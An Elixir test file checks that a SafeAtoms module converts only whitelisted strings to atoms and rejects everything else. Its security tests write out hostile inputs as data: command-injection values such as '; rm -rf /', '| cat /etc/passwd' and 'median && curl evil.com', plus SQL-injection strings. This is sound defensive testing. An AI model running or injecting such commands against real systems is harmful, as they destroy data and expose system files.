defmodule Scout.Util.SafeAtomsTest do
  use ExUnit.Case, async: true

  alias Scout.Util.SafeAtoms

  describe "goal_from_string!/1" do
    test "converts valid goal strings to atoms" do
      assert SafeAtoms.goal_from_string!("maximize") == :maximize
      assert SafeAtoms.goal_from_string!("minimize") == :minimize
    end

    test "handles case insensitivity" do
      assert SafeAtoms.goal_from_string!("MAXIMIZE") == :maximize
      assert SafeAtoms.goal_from_string!("Minimize") == :minimize
      assert SafeAtoms.goal_from_string!("MaXiMiZe") == :maximize
    end

    test "raises on invalid goal" do
      assert_raise ArgumentError, ~r/unsupported goal/, fn ->
        SafeAtoms.goal_from_string!("invalid")
      end

      assert_raise ArgumentError, ~r/unsupported goal/, fn ->
        SafeAtoms.goal_from_string!("max")
      end
    end

    test "raises on empty string" do
      assert_raise ArgumentError, fn ->
        SafeAtoms.goal_from_string!("")
      end
    end

    test "prevents atom table exhaustion attacks" do
      # Attempting to create arbitrary atoms should fail
      malicious_inputs = [
        "arbitrary_atom_#{:rand.uniform(1000000)}",
        "exploit_attempt",
        "__unsafe__",
        "Elixir.MaliciousModule"
      ]

      for input <- malicious_inputs do
        assert_raise ArgumentError, fn ->
          SafeAtoms.goal_from_string!(input)
        end
      end
    end
  end

  describe "sampler_from_string!/1" do
    test "converts valid sampler strings to atoms" do
      assert SafeAtoms.sampler_from_string!("random") == :random
      assert SafeAtoms.sampler_from_string!("tpe") == :tpe
      assert SafeAtoms.sampler_from_string!("bandit") == :bandit
      assert SafeAtoms.sampler_from_string!("grid") == :grid
    end

    test "handles case insensitivity" do
      assert SafeAtoms.sampler_from_string!("RANDOM") == :random
      assert SafeAtoms.sampler_from_string!("Tpe") == :tpe
      assert SafeAtoms.sampler_from_string!("BANDIT") == :bandit
    end

    test "raises on invalid sampler" do
      assert_raise ArgumentError, ~r/unsupported sampler/, fn ->
        SafeAtoms.sampler_from_string!("invalid")
      end

      assert_raise ArgumentError, ~r/unsupported sampler/, fn ->
        SafeAtoms.sampler_from_string!("bayesian")
      end
    end

    test "prevents atom table exhaustion via sampler names" do
      malicious_inputs = [
        "custom_sampler_#{System.system_time()}",
        "exploit",
        "Elixir.EvilSampler"
      ]

      for input <- malicious_inputs do
        assert_raise ArgumentError, fn ->
          SafeAtoms.sampler_from_string!(input)
        end
      end
    end
  end

  describe "pruner_from_string!/1" do
    test "converts valid pruner strings to atoms" do
      assert SafeAtoms.pruner_from_string!("median") == :median
      assert SafeAtoms.pruner_from_string!("hyperband") == :hyperband
      assert SafeAtoms.pruner_from_string!("successive_halving") == :successive_halving
    end

    test "handles alias for successive halving" do
      assert SafeAtoms.pruner_from_string!("sha") == :successive_halving
      assert SafeAtoms.pruner_from_string!("SHA") == :successive_halving
    end

    test "handles case insensitivity" do
      assert SafeAtoms.pruner_from_string!("MEDIAN") == :median
      assert SafeAtoms.pruner_from_string!("HyperBand") == :hyperband
    end

    test "raises on invalid pruner" do
      assert_raise ArgumentError, ~r/unsupported pruner/, fn ->
        SafeAtoms.pruner_from_string!("invalid")
      end

      assert_raise ArgumentError, ~r/unsupported pruner/, fn ->
        SafeAtoms.pruner_from_string!("percentile")
      end
    end

    test "prevents atom table exhaustion via pruner names" do
      malicious_inputs = [
        "custom_pruner_#{:rand.uniform(1000000)}",
        "arbitrary_atom",
        "Elixir.MaliciousPruner"
      ]

      for input <- malicious_inputs do
        assert_raise ArgumentError, fn ->
          SafeAtoms.pruner_from_string!(input)
        end
      end
    end
  end

  describe "status_from_string!/1" do
    test "converts valid status strings to atoms" do
      assert SafeAtoms.status_from_string!("pending") == :pending
      assert SafeAtoms.status_from_string!("running") == :running
      assert SafeAtoms.status_from_string!("completed") == :completed
      assert SafeAtoms.status_from_string!("failed") == :failed
      assert SafeAtoms.status_from_string!("pruned") == :pruned
    end

    test "handles case insensitivity" do
      assert SafeAtoms.status_from_string!("PENDING") == :pending
      assert SafeAtoms.status_from_string!("Running") == :running
      assert SafeAtoms.status_from_string!("COMPLETED") == :completed
    end

    test "raises on invalid status" do
      assert_raise ArgumentError, ~r/unsupported status/, fn ->
        SafeAtoms.status_from_string!("invalid")
      end

      assert_raise ArgumentError, ~r/unsupported status/, fn ->
        SafeAtoms.status_from_string!("cancelled")
      end
    end

    test "prevents atom table exhaustion via status values" do
      malicious_inputs = [
        "arbitrary_status_#{System.system_time()}",
        "user_controlled_atom",
        "Elixir.EvilStatus"
      ]

      for input <- malicious_inputs do
        assert_raise ArgumentError, fn ->
          SafeAtoms.status_from_string!(input)
        end
      end
    end
  end

  describe "valid_*/0 helpers" do
    test "returns list of valid goals" do
      goals = SafeAtoms.valid_goals()
      assert :maximize in goals
      assert :minimize in goals
      assert length(goals) == 2
    end

    test "returns list of valid samplers" do
      samplers = SafeAtoms.valid_samplers()
      assert :random in samplers
      assert :tpe in samplers
      assert :bandit in samplers
      assert :grid in samplers
      assert length(samplers) == 4
    end

    test "returns list of valid pruners" do
      pruners = SafeAtoms.valid_pruners()
      assert :median in pruners
      assert :hyperband in pruners
      assert :successive_halving in pruners
      assert length(pruners) == 3
    end

    test "returns list of valid statuses" do
      statuses = SafeAtoms.valid_statuses()
      assert :pending in statuses
      assert :running in statuses
      assert :completed in statuses
      assert :failed in statuses
      assert :pruned in statuses
      assert length(statuses) == 5
    end
  end

  describe "security properties" do
    test "never creates atoms from arbitrary user input" do
      # Simulate various attack vectors
      attack_vectors = [
        # Atom table exhaustion
        Enum.map(1..100, fn i -> "dynamic_atom_#{i}" end),
        # Module injection attempts
        ["Elixir.System", "Elixir.File", "Elixir.Code"],
        # Special characters
        ["__MODULE__", "__ENV__", "nil", "true", "false"],
        # Unicode attempts
        ["café", "日本語", "emoji_😀"],
        # SQL-injection style
        ["'; DROP TABLE--", "1 OR 1=1", "admin' --"],
        # Command injection style
        ["; rm -rf /", "| cat /etc/passwd", "`whoami`"]
      ]

      for vector <- attack_vectors do
        for malicious_input <- vector do
          # All of these should raise ArgumentError, not create atoms
          assert_raise ArgumentError, fn ->
            SafeAtoms.goal_from_string!(malicious_input)
          end

          assert_raise ArgumentError, fn ->
            SafeAtoms.sampler_from_string!(malicious_input)
          end

          assert_raise ArgumentError, fn ->
            SafeAtoms.pruner_from_string!(malicious_input)
          end

          assert_raise ArgumentError, fn ->
            SafeAtoms.status_from_string!(malicious_input)
          end
        end
      end
    end

    test "whitelisted atoms are safe and limited" do
      # Verify total number of possible atoms is small and controlled
      total_atoms = length(SafeAtoms.valid_goals()) +
                   length(SafeAtoms.valid_samplers()) +
                   length(SafeAtoms.valid_pruners()) +
                   length(SafeAtoms.valid_statuses())

      # Should be less than 20 total atoms (currently 14)
      assert total_atoms < 20

      # All atoms should be simple, lowercase identifiers
      all_valid_atoms = SafeAtoms.valid_goals() ++
                       SafeAtoms.valid_samplers() ++
                       SafeAtoms.valid_pruners() ++
                       SafeAtoms.valid_statuses()

      for atom <- all_valid_atoms do
        atom_string = Atom.to_string(atom)

        # Should only contain lowercase letters and underscores
        assert atom_string =~ ~r/^[a-z_]+$/,
               "Atom #{atom} contains unsafe characters"

        # Should be reasonably short
        assert String.length(atom_string) < 20,
               "Atom #{atom} is suspiciously long"
      end
    end

    test "error messages don't leak sensitive information" do
      # Error messages should be helpful but not expose internal details
      assert_raise ArgumentError, fn ->
        SafeAtoms.goal_from_string!("exploit")
      end
    end
  end

  describe "integration with user input" do
    test "safely handles HTTP query parameters" do
      # Simulate query params from web request
      query_params = %{
        "goal" => "maximize",
        "sampler" => "tpe",
        "pruner" => "median",
        "status" => "running"
      }

      # These should all work safely
      assert SafeAtoms.goal_from_string!(query_params["goal"]) == :maximize
      assert SafeAtoms.sampler_from_string!(query_params["sampler"]) == :tpe
      assert SafeAtoms.pruner_from_string!(query_params["pruner"]) == :median
      assert SafeAtoms.status_from_string!(query_params["status"]) == :running
    end

    test "safely handles JSON input" do
      # Simulate JSON configuration
      json_config = %{
        "optimization" => %{
          "goal" => "minimize",
          "sampler" => "grid",
          "pruner" => "hyperband"
        },
        "trial" => %{
          "status" => "completed"
        }
      }

      opt = json_config["optimization"]
      trial = json_config["trial"]

      assert SafeAtoms.goal_from_string!(opt["goal"]) == :minimize
      assert SafeAtoms.sampler_from_string!(opt["sampler"]) == :grid
      assert SafeAtoms.pruner_from_string!(opt["pruner"]) == :hyperband
      assert SafeAtoms.status_from_string!(trial["status"]) == :completed
    end

    test "safely handles CLI arguments" do
      # Simulate command-line arguments
      cli_args = ["--goal", "maximize", "--sampler", "random", "--pruner", "sha"]

      goal = Enum.at(cli_args, 1)
      sampler = Enum.at(cli_args, 3)
      pruner = Enum.at(cli_args, 5)

      assert SafeAtoms.goal_from_string!(goal) == :maximize
      assert SafeAtoms.sampler_from_string!(sampler) == :random
      assert SafeAtoms.pruner_from_string!(pruner) == :successive_halving
    end

    test "rejects malicious CLI injection attempts" do
      malicious_cli_args = [
        "--goal", "maximize; rm -rf /",
        "--sampler", "tpe | cat /etc/passwd",
        "--pruner", "median && curl evil.com"
      ]

      assert_raise ArgumentError, fn ->
        SafeAtoms.goal_from_string!(Enum.at(malicious_cli_args, 1))
      end

      assert_raise ArgumentError, fn ->
        SafeAtoms.sampler_from_string!(Enum.at(malicious_cli_args, 3))
      end

      assert_raise ArgumentError, fn ->
        SafeAtoms.pruner_from_string!(Enum.at(malicious_cli_args, 5))
      end
    end
  end
end
